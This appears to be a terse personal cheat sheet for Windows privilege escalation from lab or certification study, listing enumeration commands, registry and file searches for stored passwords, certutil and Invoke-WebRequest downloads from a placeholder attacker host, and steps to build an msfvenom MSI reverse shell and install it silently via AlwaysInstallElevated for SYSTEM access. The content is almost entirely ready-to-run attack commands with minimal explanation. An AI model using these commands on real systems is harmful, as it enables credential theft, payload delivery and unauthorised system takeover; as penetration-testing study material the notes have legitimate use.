1. Get sysinfo
2. net users
3. net user joe (are they a part of admin group)
5. schtasks /query /fo LIST /v
6. tasklist /SVC
7. wmic /?
8. reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
9. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
10. dir /s *pass* == *cred* == *vnc* == *.config*
11. findstr /si password *.xml *.ini *.txt
12.  reg query HKLM /f password /t REG_SZ /s
13.  reg query HKCU /f password /t REG_SZ /s



# File Transfers #
1. certutil -urlcache -split -f http://192.168.XXX.XXX:8000/test.txt test.txt'
2. Invoke-WebRequest -Uri http://192.168.XXX.XXX:8000/test.txt -Outfile test.txt

# Windows powershell privesc checker#
1. https://github.com/itm4n/PrivescCheck
Great Resource: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


# MSI # 
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
If you see:
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
1. Make a msfvenom reverse shell for msi (see Love HTB) and execute on target for system reverse shell
2. msiexec /q /i shell.msi

